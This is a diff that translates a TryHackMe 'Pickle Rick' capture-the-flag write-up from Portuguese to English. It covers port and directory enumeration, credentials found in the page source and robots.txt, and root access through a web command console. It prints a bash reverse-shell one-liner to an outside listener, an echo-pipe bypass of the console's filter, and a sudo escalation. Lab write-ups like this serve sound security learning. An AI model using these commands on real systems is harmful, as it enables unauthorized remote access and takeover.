@@ -1,39 +1,30 @@
-> [!WARNING]
-> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).
-
 # [Pickle Rick](https://tryhackme.com/room/picklerick)
 
 <a href="https://tryhackme.com/room/picklerick"><figure><img src="assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
 
 > A Rick and Morty CTF. Help turn Rick back into a human!
 
-Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/picklerick), feito por [Try Hack Me](https://tryhackme.com/p/tryhackme), [ar33zy](https://tryhackme.com/p/ar33zy) e [arebel](https://tryhackme.com/p/arebel).
+Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/picklerick), made by [Try Hack Me](https://tryhackme.com/p/tryhackme), [ar33zy](https://tryhackme.com/p/ar33zy) and [arebel](https://tryhackme.com/p/arebel).
 
-Dificuldade: `Fácil`
+Dificulty: `Easy`
 
-Resolvido em: `2026/03/28`
+Solved in: `2026/03/28`
 
-# Conteúdos
+# Table of Contents
 
-- [Pickle Rick](#pickle-rick)
-- [Conteúdos](#conteúdos)
-- [Writeup](#writeup)
-   * [Sumário](#sumário)
-   * [Reconhecimento](#reconhecimento)
-   * [Exploração](#exploração)
-   * [Escalação de Privilégios](#escalação-de-privilégios)
+TODO
 
 # Writeup
 
-## Sumário
+## Summary
 
-O desafio `Pickle Rick` consiste na aquisição das credenciais de um painel de administrador no website e, em seguida, no uso de um terminal para escalação de privilégios.
+The challenge `Pickle Rick` consists on the acquisition of credentions of an administrator panel on the website and, following suit, using the available terminal for privilege escalation.
 
-## Reconhecimento
+## Reconnaissance
 
-Como normal, a plataforma THM providencia o IP de acesso para a máquina. Primeiramente realizei um ajuste para a facilidade durante a solução: adicionei a linha `<MACHINE_IP> pr.net` para o arquivo `/etc/hosts`. Desta forma, posso acessar a máquina com a referência `pr.net`, descomplicando muitos comandos.
+As usual, THM provides a machine IP for access. Firstly, I added in `<MACHINE_IP> pr.net` to the `/etc/hosts` file for an easier time down the line. That way, I can access the machine using `pr.net` instead of its IP address.
 
-Logo após, verifiquei se tudo estava certo.
+Afterwards, I verified if everything's in line:
 
 ```bash
 ping -c 3 pr.net
@@ -47,7 +38,7 @@ PING pr.net (<MACHINE_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 176.092/222.442/257.260/34.125 ms
 ```
 
-Sem nenhuma outra informação disponível, realizei um escaneamento das portas abertas com `nmap`[^nmap] para encontrar um caminho de penetração.
+Without any more info available, I move on to make a `nmap`[^nmap] scan and finding possible penetration routes.
 
 ```bash
 nmap -T4 -sV -A pr.net
@@ -66,13 +57,13 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 ```
 
-Aqui descobri que a porta `22` está disponível para `ssh`, e que a porta `80` para `html` (com Apache). Como entradas por `ssh` são muito mais complexas, explorarei o `html`.
+Here I discover that port `22` is open for `ssh`, and that port `80` is for `html` (running Apache). Since `ssh` is significantly harder to crack, I'll explore `html`.
 
 ## Exploração
 
 <figure><img src="assets/index.jpg"></figure>
 
-A página de entrada do `html` não contém muita informação visível. Ao vasculhar o código fonte, porém:
+The landing page for `html` doesn't contain much visible info... Searching through the source code, however:
 
 ```html
 <body>
@@ -96,7 +87,7 @@ A página de entrada do `html` não contém muita informação visível. Ao vasc
 </body>
 ```
 
-Ainda, sem fazer muito, já descobri um nome de usuário, `R1ckRul3s`. Se existe um usuário, existe algum ponto de acesso! Corroborando essa ideia é outro trecho do código fonte:
+Without doing much, I'm already with an username, `R1ckRul3s`. If there's an user, there must be a panel! Following that idea is another section of the source code:
 
 ```html
   <style>
@@ -108,11 +99,11 @@ Ainda, sem fazer muito, já descobri um nome de usuário, `R1ckRul3s`. Se existe
   </style>
 ```
 
-Que mostra a existência do diretório `assets/`. Acessá-lo providencia alguns outros arquivos, mas nada excepcional.
+That shows the existence of other directories (in this case, `assets/`). Within it I find some files, but nothing particularly exceptional.
 
 <figure><img src="assets/assets.jpg"></figure>
 
-Agora segui para o próximo passo lógico: vasculhamento de diretórios em procura de um painel de entrada. Usei da ferramenta `gobuster`[^gobuster] com uma das wordlists padrões do kali[^wl-dirl23med] para vasculhar a porta `html`, procurando por extensões comuns em websites (`.html`, `.php` e `.txt`):
+Following the next logical step: sweep directories in search of an entry panel of sorts. I used `gobuster`[^gobuster] with one of kali's default wordlists[^wl-dirl23med] to search the `html` port, searching with common website extensions (`.html`, `.php` e `.txt`):
 
 ```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u pr.net -x .html,.txt,.php -t 50
@@ -138,27 +129,27 @@ Starting gobuster in directory enumeration mode
 /robots.txt           (Status: 200) [Size: 17]
 ```
 
-Já havia explorado `/index.html` e `/assets` nesse ponto, logo decidi checar `/login.php`.
+I had already explored `/index.html` and `/assets` at this point, so I decided to check `/login.php`.
 
 <figure><img src="assets/panel.jpg"></figure>
 
-Bem, a interface de acesso foi encontrada. Agora basta uma senha. Após alguns testes simples como `1234`, `admin` e `picklerick`, decidi retornar ao resultado do `gobuster` e verificar as outras descobertas. Isto é, a *única* outra descoberta, `/robots.txt`.[^robotstxt]
+Well, the login interface has been found. Now I need only a password. After a few failed attempts with `1234`, `admin` and `picklerick`, I chose to go back to `gobuster`'s results and see other options. That is, the *only* other option, `/robots.txt`[^robotstxt].
 
 ```
 Wubbalubbadubdub
 ```
 
-Mais um valor de senha para tentar. Usando do usuário `R1ckRul3s` e da senha `Wubbalubbadubdub` a página de painel libera o acesso a outra área do servidor.
+Another password to try! Using `R1ckRul3s` as user and `Wubbalubbadubdub` as password the panel cracks and gives access to the administrator panel.
 
-## Escalação de Privilégios
+## Privilege Escalation
 
 <figure><img src="assets/portal.jpg"></figure>
 
-Ótimo! Com uma linha de comandos direta o acesso simplifica drasticamente. Antes de ir fundo nisso, explorei as outras abas disponíveis mas todas possuíam a mesma interface:
+Great! With a direct command-line the access simplifies drastically. Before I go deep in this, though, I checked out other available tabs but all had the same interface:
 
 <figure><img src="assets/pickle.jpg"></figure>
 
-Já que o console é o único elemento iterativo novo, realizei um `ls`[^ls] para ver os arquivos disponíveis...
+Since they're so insistent, I came back to the console and did a quick `ls` to poke around...
 
 ```bash
 ls
@@ -169,17 +160,17 @@ denied.php
 ...
 ```
 
-Certamente um dos ingredientes (a bandeira do CTF) está dentro de `Sup3rS3cretPickl3Ingred.txt`. Contudo, logo percebi que não seria tão fácil: ao realizar o comando `cat Sup3rS3cretPickl3Ingred.txt`...
+Certainly one of the ingredients (the CTF flag) is inside `Sup3rS3cretPickl3Ingred.txt`. Though, soon I noticed it wasn't going to be that easy, as when I tried executing `cat Sup3rS3cretPickl3Ingred.txt`...
 
 <figure><img src="assets/fail.jpg"></figure>
 
-Com um ambiente restrito assim, decidi realizar uma reverse shell[^rv] para facilitar o uso do terminal. Segui para descobrir qual o terminal rodando nesse sistema:
+With such a restrictive environment, I decided to make a reverse shell[^rv] to ease out using the terminal. First I had to figure out which shell was running:
 
 ```bash
 sh --version
 ```
 
-Nenhuma resposta.
+No result.
 
 ```bash
 bash --version
@@ -191,19 +182,19 @@ This is free software; you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.
 ```
 
-Ótimo! Encontrei a versão do terminal, `bash 5.0.17`. Na minha máquina eu abri um terminal dedicado e invoquei o `netcat`[^nc] com `nc -lvnp 1234`, já deixando-o preparado. Usando o site [revshells](https://www.revshells.com/) como recurso eu criei um revshell:
+Great! Found the terminal, `bash 5.0.17`. On my machine I opened a dedicated terminal and executed `netcat`[^nc] with `nc -lvnp 1234`, setting it up to listen. Using the website [revshells](https://www.revshells.com/) as a resource, I made a revshell:
 
 ```bash
 bash -i >& /dev/tcp/<MY_MACHINE_IP>/1234 0>&1
 ```
 
-Mas o comando não funcionou quando invocado desta forma. Com `echo`, realizei um bypass rápido:
+But the command did not work when executed this way. Quick thinking, I did the first bypass in mind:
 
 ```bash
 echo "bash -i >& /dev/tcp/<MY_MACHINE_IP>/1234 0>&1" | bash
 ```
 
-O que simplesmente encadeia meu comando, e funcionou, estabelecendo a conexão com meu terminal. Imediatamente, invoquei `sudo -l` para verificar as permissões do sistema, obtendo ótimas notícias:
+Which only really chains my command, and it worked, establishing connection with the terminal. Immediatelly, I ran `sudo -l` to verify which were the system permission, receiving great news:
 
 ```bash
 Matching Defaults entries for www-data on ip-<MACHINE_IP>:
@@ -213,7 +204,7 @@ User www-data may run the following commands on ip-<MACHINE_IP>:
     (ALL) NOPASSWD: ALL
 ```
 
-O usuário `www-data` possuia permissão `(ALL) NOPASSWD: ALL`. Ou seja, bastava realizar a elevação imediata de privilégios com `sudo sh`:
+The user `www-data` had permission `(ALL) NOPASSWD: ALL`. Which meant that I didn't need any trouble escalating privileges, just a simple `sudo sh` would do:
 
 ```bash
 sudo sh
@@ -221,7 +212,7 @@ whoami
 root
 ```
 
-O último passo, agora, era buscar os três ingredientes (as três flags). Além de `/var/www/html/Sup3rS3cretPickl3Ingred.txt`, também encontrei `/usr/rick/second ingredients` e `/root/3rd.txt`. Com isso, a máquina foi completa.
+The last step, now, was to search the three ingredients (the three flags). Besides the earlier `/var/www/html/Sup3rS3cretPickl3Ingred.txt`, there was also `/usr/rick/second ingredients` and `/root/3rd.txt`. With that, the challenge was over.
 
 [^nmap]: https://github.com/nmap/nmap
 [^gobuster]: https://github.com/OJ/gobuster
